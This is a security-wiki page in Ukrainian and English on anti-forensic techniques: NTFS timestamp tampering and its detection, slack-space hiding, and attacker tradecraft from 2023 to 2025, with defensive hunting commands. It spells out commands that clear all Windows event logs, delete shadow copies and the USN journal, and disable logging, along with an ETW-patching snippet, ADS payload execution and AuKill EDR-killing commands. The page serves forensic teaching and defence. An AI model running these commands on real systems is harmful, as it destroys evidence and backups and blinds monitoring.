# Anti-Forensic Techniques

{{#include ../../banners/hacktricks-training.md}}

## Timestamps

Зловмисник може бути зацікавлений у **зміні часових міток файлів**, щоб уникнути виявлення.\
Часові мітки можна знайти всередині MFT в атрибутах `$STANDARD_INFORMATION` \_\_ і \_\_ `$FILE_NAME`.

Обидва атрибути містять 4 часові мітки: **модифікації**, **доступу**, **створення** та **модифікації запису MFT** (MACE або MACB).

**Windows explorer** та інші інструменти відображають інформацію з **`$STANDARD_INFORMATION`**.

### TimeStomp - Anti-forensic Tool

Цей інструмент **змінює інформацію про часові мітки** всередині **`$STANDARD_INFORMATION`**, але **не** змінює інформацію всередині **`$FILE_NAME`**. Тому можна **виявити** **підозрілу** **активність**.

### Usnjrnl

**USN Journal** (Update Sequence Number Journal) — це функція NTFS (файлової системи Windows NT), яка відстежує зміни тома. Інструмент [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) дає змогу досліджувати ці зміни.

![TimeStomp - Anti-forensic Tool - Usnjrnl: USN Journal (Update Sequence Number Journal) — це функція NTFS (файлової системи Windows NT), яка відстежує зміни тома. Т...](<../../images/image (801).png>)

На попередньому зображенні показано **вивід** **інструмента**, де можна побачити, що до файлу було внесено **певні зміни**.

### $LogFile

**Усі зміни метаданих файлової системи записуються** в процесі, відомому як [журналювання з випереджальним записом](https://en.wikipedia.org/wiki/Write-ahead_logging). Записані метадані зберігаються у файлі `**$LogFile**`, розташованому в кореневому каталозі файлової системи NTFS. Для аналізу цього файлу та виявлення змін можна використовувати такі інструменти, як [LogFileParser](https://github.com/jschicht/LogFileParser).

![Usnjrnl - $LogFile: Усі зміни метаданих файлової системи записуються в процесі, відомому як журналювання з випереджальним записом. Записані метадані зберігаються у файлі $LogFile , розташованому в корені...](<../../images/image (137).png>)

Знову ж таки, у виводі інструмента можна побачити, що було внесено **певні зміни**.

За допомогою того самого інструмента можна визначити, **коли саме були змінені часові мітки**:

![Usnjrnl - $LogFile: За допомогою того самого інструмента можна визначити, коли саме були змінені часові мітки](<../../images/image (1089).png>)

- CTIME: Час створення файлу
- ATIME: Час модифікації файлу
- MTIME: Час модифікації запису MFT файлу
- RTIME: Час доступу до файлу

### `$STANDARD_INFORMATION` and `$FILE_NAME` comparison

Іншим способом виявлення підозріло змінених файлів є порівняння часу в обох атрибутах у пошуках **невідповідностей**.

### Nanoseconds

Часові мітки **NTFS** мають **точність** **100 наносекунд**. Тому пошук файлів із часовими мітками на кшталт 2010-10-10 10:10:**00.000:0000 є дуже підозрілим**.

### SetMace - Anti-forensic Tool

Цей інструмент може змінювати обидва атрибути `$STARNDAR_INFORMATION` і `$FILE_NAME`. Однак починаючи з Windows Vista для зміни цієї інформації потрібна запущена ОС.

## Data Hiding

NFTS використовує кластери та мінімальний розмір інформації. Це означає, що якщо файл займає один із половиною кластера, **залишкова половина ніколи не використовуватиметься**, доки файл не буде видалено. Отже, у цьому slack space можна **приховувати дані**.

Існують такі інструменти, як slacker, що дають змогу приховувати дані в цьому «прихованому» просторі. Однак аналіз `$logfile` і `$usnjrnl` може показати, що було додано певні дані:

![SetMace - Anti-forensic Tool - Data Hiding: Існують такі інструменти, як slacker, що дають змогу приховувати дані в цьому «прихованому» просторі. Однак аналіз $logfile і $usnjrnl може показати, що...](<../../images/image (1060).png>)

Після цього slack space можна отримати за допомогою таких інструментів, як FTK Imager. Зверніть увагу, що цей тип інструментів може зберігати вміст в обфускованому або навіть зашифрованому вигляді.

## UsbKill

Цей інструмент **вимикає комп’ютер, якщо виявляє будь-які зміни** в USB-портах.\
Виявити його можна, перевіривши запущені процеси та **переглянувши кожен запущений python-скрипт**.

## Live Linux Distributions

Ці дистрибутиви **виконуються в оперативній пам’яті**. Єдиний спосіб їх виявити — якщо файлову систему NTFS **підключено з дозволами на запис**. Якщо її підключено лише з дозволами на читання, виявити вторгнення буде неможливо.

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows Configuration

Можна вимкнути кілька методів журналювання Windows, щоб значно ускладнити forensic-розслідування.

### Disable Timestamps - UserAssist

Це ключ реєстру, який зберігає дати й час запуску кожного виконуваного файлу користувачем.

Вимкнення UserAssist потребує двох кроків:

1. Встановіть два ключі реєстру — `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` і `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` — у нуль, щоб вказати, що UserAssist потрібно вимкнути.
2. Очистьте піддерева реєстру, схожі на `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Disable Timestamps - Prefetch

Ця функція зберігає інформацію про запущені застосунки для підвищення продуктивності Windows. Однак ця інформація також може бути корисною під час forensic-аналізу.

- Запустіть `regedit`
- Виберіть шлях `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Клацніть правою кнопкою миші на `EnablePrefetcher` і `EnableSuperfetch`
- Для кожного з них виберіть Modify, щоб змінити значення з 1 (або 3) на 0
- Перезапустіть систему

### Disable Timestamps - Last Access Time

Щоразу, коли папку відкривають із тому NTFS на сервері Windows NT, система оновлює поле часової мітки в кожній папці зі списку, яке називається часом останнього доступу. На інтенсивно використовуваному томі NTFS це може впливати на продуктивність.

1. Відкрийте редактор реєстру (Regedit.exe).
2. Перейдіть до `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Знайдіть `NtfsDisableLastAccessUpdate`. Якщо його немає, додайте цей DWORD і встановіть його значення в 1, що вимкне цей процес.
4. Закрийте редактор реєстру та перезавантажте сервер.

### Delete USB History

Усі **записи USB-пристроїв** зберігаються в реєстрі Windows у ключі реєстру **USBSTOR**, який містить підключі, що створюються щоразу після підключення USB-пристрою до ПК або ноутбука. Цей ключ можна знайти тут: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Видалення цього ключа** призведе до видалення історії USB.\
Також можна скористатися інструментом [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html), щоб переконатися, що записи видалено (і видалити їх).

Ще одним файлом, у якому зберігається інформація про USB-пристрої, є `setupapi.dev.log` у `C:\Windows\INF`. Його також слід видалити.

### Disable Shadow Copies

**Переглянути** shadow copies можна за допомогою `vssadmin list shadowstorage`\
**Видалити** їх можна командою `vssadmin delete shadow`

Також їх можна видалити через GUI, виконавши кроки, описані тут: [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Щоб вимкнути shadow copies, виконайте [ці кроки](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Відкрийте програму Services, ввівши «services» у поле текстового пошуку після натискання кнопки запуску Windows.
2. У списку знайдіть «Volume Shadow Copy», виберіть його та відкрийте Properties, клацнувши правою кнопкою миші.
3. У розкривному списку «Startup type» виберіть Disabled, а потім підтвердьте зміну, натиснувши Apply і OK.

Також можна змінити в реєстрі конфігурацію файлів, які копіюватимуться в shadow copy: `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Overwrite deleted files

- Можна використати **інструмент Windows**: `cipher /w:C`. Він вкаже cipher видалити всі дані з доступного невикористаного дискового простору на диску C.
- Також можна використовувати такі інструменти, як [**Eraser**](https://eraser.heidi.ie)

### Delete Windows event logs

- Windows + R --> eventvwr.msc --> Розгорніть «Windows Logs» --> Клацніть правою кнопкою миші кожну категорію та виберіть «Clear Log»
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Disable Windows event logs

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- У розділі services вимкніть службу «Windows Event Log»
- `WEvtUtil.exec clear-log` або `WEvtUtil.exe cl`

### Disable $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Recent versions of Windows 10/11 and Windows Server keep **rich PowerShell forensic artifacts** under
`Microsoft-Windows-PowerShell/Operational` (events 4104/4105/4106).
Attackers can disable or wipe them on-the-fly:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Захисники повинні відстежувати зміни до цих ключів реєстру та масове видалення подій PowerShell.

### Патчинг ETW (Event Tracing for Windows)

Продукти безпеки кінцевих точок значною мірою покладаються на ETW. Популярний у 2024 році метод ухилення полягає в патчингу `ntdll!EtwEventWrite`/`EtwEventWriteFull` у пам’яті, щоб кожен виклик ETW повертав `STATUS_SUCCESS`, не генеруючи подію:<sup>[[5]](#references)</sup>
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Public PoCs (наприклад, `EtwTiSwallow`) реалізують той самий примітив у PowerShell або C++.
Оскільки патч є **локальним для процесу**, EDR, що працюють всередині інших процесів, можуть його пропустити.<sup>[[5]](#references)</sup>
Виявлення: порівняти `ntdll` у пам’яті з версією на диску або встановити hook до переходу в user-mode.

### Alternate Data Streams (ADS): відродження

У 2023 році було помічено, як malware-кампанії (наприклад, loaders **FIN12**) розміщують бінарні файли другого етапу
всередині ADS, щоб залишатися непомітними для традиційних сканерів:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Перелічуйте streams за допомогою `dir /R`, `Get-Item -Stream *` або Sysinternals `streams64.exe`.
Копіювання host file до FAT/exFAT або через SMB видалить hidden stream, що може бути використано
дослідниками для відновлення payload.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver тепер регулярно використовується для **anti-forensics** під час атак
ransomware.
Open-source tool **AuKill** завантажує підписаний, але вразливий driver (`procexp152.sys`), щоб
призупинити або завершити роботу EDR і forensic sensors **до шифрування та знищення логів**:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Після цього драйвер видаляється, залишаючи мінімум артефактів.<sup>[[1]](#references)</sup>
Заходи пом'якшення: увімкніть Microsoft vulnerable-driver blocklist (HVCI/SAC)
та налаштуйте сповіщення про створення kernel-сервісів із доступних для запису користувачами шляхів.

---

## Linux Anti-Forensics: Self-patching and Cloud C2 (2023–2025)

### Самопатчинг скомпрометованих сервісів для зниження рівня виявлення (Linux)
Зловмисники дедалі частіше виконують «self-patch» сервісу одразу після його експлуатації, щоб одночасно запобігти повторній експлуатації та придушити виявлення на основі вразливості. Ідея полягає в заміні вразливих компонентів найновішими легітимними upstream-бінарними файлами/JAR-файлами, щоб сканери повідомляли, що хост оновлено, тоді як persistence і C2 залишаються.<sup>[[3]](#references)</sup>

Приклад: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Після post-exploitation зловмисники завантажили легітимні JAR-файли з Maven Central (repo1.maven.org), видалили вразливі JAR-файли з інсталяції ActiveMQ та перезапустили брокер.
- Це усунуло початкову RCE, водночас зберігши інші foothold-и (cron, зміни конфігурації SSH, окремі C2-імпланти).

Операційний приклад (ілюстративний)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Поради з forensic/hunting
- Перевіряйте service directories на наявність незапланованих замін бінарних файлів/JAR:
- Debian/Ubuntu: `dpkg -V activemq` і порівнюйте хеші/шляхи файлів із дзеркалами репозиторію.
- RHEL/CentOS: `rpm -Va 'activemq*'`
- Шукайте версії JAR, наявні на диску, але не належні package manager, або symbolic links, оновлені поза штатним процесом.
- Timeline: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` для зіставлення ctime/mtime з часовим вікном компрометації.
- Shell history/process telemetry: ознаки використання `curl`/`wget` для звернення до `repo1.maven.org` або інших artifact CDN одразу після початкової експлуатації.
- Change management: перевіряйте, хто і навіщо застосував “patch”, а не лише наявність patched version.

### Cloud‑service C2 with bearer tokens and anti‑analysis stagers
Зафіксована тактика поєднувала кілька довготривалих C2-каналів і anti-analysis пакування:<sup>[[3]](#references)</sup>
- Захищені паролем PyInstaller ELF loaders для ускладнення sandboxing і static analysis (наприклад, зашифрований PYZ, тимчасове розпакування в `/_MEI*`).
- Indicators: збіги `strings`, такі як `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Runtime artifacts: розпакування до `/tmp/_MEI*` або custom `--runtime-tmpdir` paths.
- Dropbox-backed C2 з hardcoded OAuth Bearer tokens
- Network markers: `api.dropboxapi.com` / `content.dropboxapi.com` з `Authorization: Bearer <token>`.
- Шукайте в proxy/NetFlow/Zeek/Suricata вихідні HTTPS-з’єднання до Dropbox domains від server workloads, які зазвичай не синхронізують файли.
- Parallel/backup C2 через tunneling (наприклад, Cloudflare Tunnel `cloudflared`), що зберігає контроль, якщо один канал заблоковано.
- Host IOCs: процеси/units `cloudflared`, config у `~/.cloudflared/*.json`, вихідні з’єднання через 443 до Cloudflare edges.

### Persistence і “hardening rollback” для збереження доступу (приклади Linux)
Attackers часто поєднують self-patching із durable access paths:<sup>[[3]](#references)</sup>
- Cron/Anacron: зміни stub `0anacron` у кожному `/etc/cron.*/` directory для періодичного виконання.
- Hunt:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH configuration hardening rollback: увімкнення root logins і зміна default shells для low-privileged accounts.
- Hunt для root login enablement:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# flag values like "yes" or overly permissive settings
```
- Hunt для підозрілих interactive shells у system accounts (наприклад, `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Random, short-named beacon artifacts (8 alphabetical chars), записані на диск і такі, що також звертаються до cloud C2:
- Hunt:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Defenders should correlate ці artifacts із external exposure і service patching events, щоб виявити anti-forensic self-remediation, використану для приховування початкової експлуатації.

## References

- [1] [Sophos X-Ops – AuKill: Weaponized Vulnerable Driver для вимкнення EDR (березень 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patching EtwEventWrite для stealth: detection і hunting (червень 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching для persistence: як DripDropper Linux malware переміщується через cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Hiding Your .NET - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
{{#include ../../banners/hacktricks-training.md}}
